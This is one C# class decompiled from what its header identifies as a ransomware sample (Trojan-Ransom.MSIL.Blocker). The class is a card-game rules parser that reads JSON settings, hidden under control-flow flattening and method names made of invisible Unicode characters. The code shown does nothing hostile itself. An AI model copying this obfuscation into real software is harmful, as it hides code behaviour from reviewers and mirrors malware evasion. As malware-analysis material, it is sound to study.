// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Rules
// Assembly: IOExcepti, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 72674A88-3F84-4927-9D84-82118D6CBF01
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-49811dca565bead069108819f9ad132a2214364381f97dcf7f0f439614cc8ff4.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Rules
  {
    public int SprintCount { get; private set; }

    public int MaxImpact { get; private set; }

    public Card[] Cards { get; private set; }

    public int InitialResources { get; private set; }

    public int NormalPlanningCount { get; private set; }

    public int NormalPlanningCost { get; private set; }

    public int OverPlanningCost { get; private set; }

    public int SprintsWonWithoutPlanning { get; private set; }

    public float[] RiskChances { get; private set; }

    public bool EconomicsAffectsAll { get; private set; }

    public int StayOnSprintMinDiff { get; private set; }

    public bool OnlyOneWinner { get; private set; }

    private Rules()
    {
label_1:
      int num1 = 1566217981;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 715394294)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 52938806 ^ -2139684877;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public static Rules Deserialize(JSONNode json)
    {
label_1:
      int num1 = -473871098;
      int asInt;
      Rules rules;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -661086023)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            asInt = json["max-impact"].AsInt;
            num1 = (int) num2 * 1181028325 ^ -1903962379;
            continue;
          case 3:
            num1 = (int) num2 * -854052235 ^ 2134816096;
            continue;
          case 4:
            rules = new Rules()
            {
              SprintCount = json["sprints"].AsInt,
              MaxImpact = asInt,
              Cards = Rules.ParseDeck(json["deck"], asInt),
              InitialResources = json["initial-resources"].AsInt,
              NormalPlanningCount = json["normal-planning-count"].AsInt,
              NormalPlanningCost = json["normal-planning-cost"].AsInt,
              OverPlanningCost = json["over-planning-cost"].AsInt,
              SprintsWonWithoutPlanning = json["sprints-won-without-planning"].AsInt,
              RiskChances = Rules.ParseRiskChances(json["risk-chances"]),
              EconomicsAffectsAll = json["economics-affects-all"].AsBool,
              StayOnSprintMinDiff = json["stay-on-sprint-min-diff"].AsInt,
              OnlyOneWinner = json["only-one-winner"].AsBool
            };
            num1 = (int) num2 * -791228924 ^ -535494089;
            continue;
          default:
            goto label_6;
        }
      }
label_6:
      return rules;
    }

    private static float[] ParseRiskChances(JSONNode json)
    {
label_1:
      int num1 = 893791272;
      float[] numArray;
      float[] riskChances;
      int aIndex;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1587882960)) % 9U)
        {
          case 0:
            num1 = (int) num2 * 201003318 ^ -1454691275;
            continue;
          case 1:
            numArray = new float[json.Count];
            num1 = (int) num2 * 1235809560 ^ 599242539;
            continue;
          case 2:
            numArray[aIndex] = json[aIndex].AsFloat;
            num1 = 1338269164;
            continue;
          case 3:
            goto label_1;
          case 4:
            ++aIndex;
            num1 = (int) num2 * -419683331 ^ -1312064708;
            continue;
          case 6:
            riskChances = numArray;
            num1 = (int) num2 * 1880305354 ^ -1863808876;
            continue;
          case 7:
            aIndex = 0;
            num1 = (int) num2 * 180026466 ^ 1433593830;
            continue;
          case 8:
            int num3;
            num1 = num3 = aIndex < numArray.Length ? 101946412 : (num3 = 610257803);
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return riskChances;
    }

    private static Card[] ParseDeck(JSONNode json, int maxImpact)
    {
label_1:
      int num1 = 1449458292;
      int aIndex1;
      List<Card> cardList;
      int aIndex2;
      int num2;
      int count;
      JSONNode jsonNode;
      Card[] array;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 1113915255)) % 23U)
        {
          case 0:
            num1 = (int) num3 * 23773173 ^ -1212679487;
            continue;
          case 1:
            num1 = 925552714;
            continue;
          case 2:
            int num4;
            num1 = num4 = num2 >= jsonNode[aIndex1].AsInt ? 1523474629 : (num4 = 969921506);
            continue;
          case 3:
            cardList = new List<Card>();
            num1 = (int) num3 * 1578303324 ^ 1817634341;
            continue;
          case 4:
            num1 = (int) num3 * -2091189476 ^ 900520521;
            continue;
          case 5:
            goto label_1;
          case 6:
            count = json.Count;
            num1 = (int) num3 * -710538685 ^ -1631125436;
            continue;
          case 7:
            bool flag = aIndex1 < maxImpact;
            cardList.Add(new Card()
            {
              Impact = flag ? -(maxImpact - aIndex1) : maxImpact * 2 - aIndex1,
              Type = aIndex2
            });
            num1 = 968839213;
            continue;
          case 8:
            int num5;
            num1 = num5 = aIndex2 >= count ? 2129475528 : (num5 = 1679158281);
            continue;
          case 9:
            aIndex1 = 0;
            num1 = (int) num3 * -460349332 ^ 1141554159;
            continue;
          case 10:
            array = cardList.ToArray();
            num1 = (int) num3 * -460895255 ^ 1899104869;
            continue;
          case 11:
            num1 = (int) num3 * 1584416747 ^ -145735304;
            continue;
          case 12:
            num1 = 9187117;
            continue;
          case 13:
            int num6;
            num1 = num6 = aIndex1 < maxImpact * 2 ? 963558538 : (num6 = 1034945124);
            continue;
          case 14:
            aIndex2 = 0;
            num1 = (int) num3 * 587087214 ^ 2145012410;
            continue;
          case 15:
            num2 = 0;
            num1 = (int) num3 * 710312074 ^ 300520735;
            continue;
          case 16:
            ++aIndex2;
            num1 = (int) num3 * -604375712 ^ 120292596;
            continue;
          case 17:
            ++aIndex1;
            num1 = (int) num3 * -905857040 ^ -1159031568;
            continue;
          case 18:
            jsonNode = json[aIndex2];
            num1 = 2100330079;
            continue;
          case 19:
            ++num2;
            num1 = (int) num3 * -1420513291 ^ 2014131423;
            continue;
          case 20:
            num1 = (int) num3 * -642222625 ^ -822941444;
            continue;
          case 21:
            num1 = (int) num3 * 1244633828 ^ 1727376379;
            continue;
          default:
            goto label_24;
        }
      }
label_24:
      return array;
    }

    public override string ToString()
    {
label_1:
      int num1 = 584755517;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1911593440)) % 3U)
        {
          case 1:
            str = Rules.\u206B⁬‎‏⁬‪‎​⁭‎​⁪⁬‫⁭⁭‬‭⁯⁮⁬⁪⁫⁮⁪⁪‪⁪‏⁬‬‪‬‎‬​‍⁫⁭‫‮("sprints: {0},\nmax-impact:{1},\ndeck: \n{2},\n\ninitial-resources: {3},\n\nnormal-planning-count: {4},\nnormal-planning-cost: {5},\nover-planning-cost: {6},\nsprints-won-without-planning: {7},\n\nrisk-chances: {8},\n\neconomics-affects-all: {9},\nstay-on-sprint-min-diff: {10},\nonly-one-winner: {11}", new object[12]
            {
              (object) this.SprintCount,
              (object) this.MaxImpact,
              (object) this.CardsToString(),
              (object) this.InitialResources,
              (object) this.NormalPlanningCount,
              (object) this.NormalPlanningCost,
              (object) this.OverPlanningCost,
              (object) this.SprintsWonWithoutPlanning,
              (object) this.RiskChancesToString(),
              (object) this.EconomicsAffectsAll,
              (object) this.StayOnSprintMinDiff,
              (object) this.OnlyOneWinner
            });
            num1 = (int) num2 * 627720070 ^ 390527016;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    private string CardsToString()
    {
label_1:
      int num1 = -1088942408;
      string str1;
      string str2;
      int num2;
      Card card1;
      int index;
      Card[] cards;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -560858305)) % 15U)
        {
          case 0:
            num1 = (int) num3 * -1096454705 ^ -1381633977;
            continue;
          case 1:
            num1 = (int) num3 * -1903193056 ^ 485711925;
            continue;
          case 2:
            card1 = cards[index];
            num1 = -220227147;
            continue;
          case 3:
            num2 = card1.Type;
            num1 = (int) num3 * -1401509053 ^ -425257723;
            continue;
          case 4:
            num1 = (int) num3 * 1261233171 ^ 1013925183;
            continue;
          case 6:
            ++index;
            num1 = (int) num3 * 1278675169 ^ 2127305160;
            continue;
          case 7:
            str2 = Rules.\u202E‫​‮‍‌‎⁯‫⁭⁭‌‏⁬‪‬‎‌‎‏‮‎⁯⁭‬‭‭⁮⁭⁪⁭‭‪⁬‬‪‪⁮‮⁪‮(str1, "\n]");
            num1 = (int) num3 * -403381198 ^ 1609067231;
            continue;
          case 8:
            str1 = Rules.\u202E‫​‮‍‌‎⁯‫⁭⁭‌‏⁬‪‬‎‌‎‏‮‎⁯⁭‬‭‭⁮⁭⁪⁭‭‪⁬‬‪‪⁮‮⁪‮(str1, "\n\t");
            num1 = (int) num3 * -447067690 ^ -693143410;
            continue;
          case 9:
            goto label_1;
          case 10:
            int num4;
            num1 = num4 = index < cards.Length ? -1110192172 : (num4 = -1737095872);
            continue;
          case 11:
            cards = this.Cards;
            index = 0;
            num1 = (int) num3 * 255140147 ^ 171892255;
            continue;
          case 12:
            string str3 = str1;
            Card card2 = card1;
            string str4 = card2 != null ? Rules.\u202B⁬​‏‪⁪⁫‮‍‮⁫‭‏⁫‎⁭⁯⁪‍⁪‬⁮⁫‪‌​⁪⁫‪‮‭‏⁮⁬‬‌‏‫‏‪‮((object) card2) : (string) null;
            str1 = Rules.\u206E⁮‬⁬‏⁬⁯⁫⁭⁫‏‪⁪‪‍‪‎‭‍‪⁬‍‎‮⁫‫⁭⁮‍⁬⁬⁭‌​‫⁬⁬‌​⁫‮(str3, str4, " ");
            num1 = -977117288;
            continue;
          case 13:
            int num5 = num2 == card1.Type ? 507763038 : (num5 = 1545307596);
            num1 = num5 ^ (int) num3 * 421463508;
            continue;
          case 14:
            str1 = "[\n\t";
            num2 = 0;
            num1 = (int) num3 * 460085720 ^ -870784913;
            continue;
          default:
            goto label_16;
        }
      }
label_16:
      return str2;
    }

    private string RiskChancesToString()
    {
label_1:
      int num1 = 109832195;
      string str1;
      int index;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1485296602)) % 9U)
        {
          case 0:
            ++index;
            num1 = (int) num2 * 197203938 ^ 1240256745;
            continue;
          case 1:
            str1 = Rules.\u202E‫​‮‍‌‎⁯‫⁭⁭‌‏⁬‪‬‎‌‎‏‮‎⁯⁭‬‭‭⁮⁭⁪⁭‭‪⁬‬‪‪⁮‮⁪‮("[ ", this.RiskChances[0].ToString((IFormatProvider) Rules.\u206F⁪‬⁭⁫⁮‭⁮⁬‍⁬‪‎​‮​⁮​⁬⁫‍‭⁯‎‌⁯‮‫‫⁪‍‌‌‭⁭‫‌‬‭‎‮()));
            num1 = (int) num2 * 1225531996 ^ 456929134;
            continue;
          case 2:
            num1 = (int) num2 * -133443809 ^ 636703867;
            continue;
          case 3:
            goto label_1;
          case 5:
            index = 1;
            num1 = (int) num2 * -368633433 ^ 1724338452;
            continue;
          case 6:
            str1 = Rules.\u206E⁮‬⁬‏⁬⁯⁫⁭⁫‏‪⁪‪‍‪‎‭‍‪⁬‍‎‮⁫‫⁭⁮‍⁬⁬⁭‌​‫⁬⁬‌​⁫‮(str1, ", ", this.RiskChances[index].ToString((IFormatProvider) Rules.\u206F⁪‬⁭⁫⁮‭⁮⁬‍⁬‪‎​‮​⁮​⁬⁫‍‭⁯‎‌⁯‮‫‫⁪‍‌‌‭⁭‫‌‬‭‎‮()));
            num1 = 1181721494;
            continue;
          case 7:
            int num3;
            num1 = num3 = index >= this.RiskChances.Length ? 1703095914 : (num3 = 1690745349);
            continue;
          case 8:
            str2 = Rules.\u202E‫​‮‍‌‎⁯‫⁭⁭‌‏⁬‪‬‎‌‎‏‮‎⁯⁭‬‭‭⁮⁭⁪⁭‭‪⁬‬‪‪⁮‮⁪‮(str1, " ]");
            num1 = (int) num2 * 2076077125 ^ 157504463;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return str2;
    }

    static string \u206B⁬‎‏⁬‪‎​⁭‎​⁪⁬‫⁭⁭‬‭⁯⁮⁬⁪⁫⁮⁪⁪‪⁪‏⁬‬‪‬‎‬​‍⁫⁭‫‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static string \u202E‫​‮‍‌‎⁯‫⁭⁭‌‏⁬‪‬‎‌‎‏‮‎⁯⁭‬‭‭⁮⁭⁪⁭‭‪⁬‬‪‪⁮‮⁪‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u202B⁬​‏‪⁪⁫‮‍‮⁫‭‏⁫‎⁭⁯⁪‍⁪‬⁮⁫‪‌​⁪⁫‪‮‭‏⁮⁬‬‌‏‫‏‪‮([In] object obj0) => obj0.ToString();

    static string \u206E⁮‬⁬‏⁬⁯⁫⁭⁫‏‪⁪‪‍‪‎‭‍‪⁬‍‎‮⁫‫⁭⁮‍⁬⁬⁭‌​‫⁬⁬‌​⁫‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static CultureInfo \u206F⁪‬⁭⁫⁮‭⁮⁬‍⁬‪‎​‮​⁮​⁬⁫‍‭⁯‎‌⁯‮‫‫⁪‍‌‌‭⁭‫‌‬‭‎‮() => CultureInfo.InvariantCulture;
  }
}
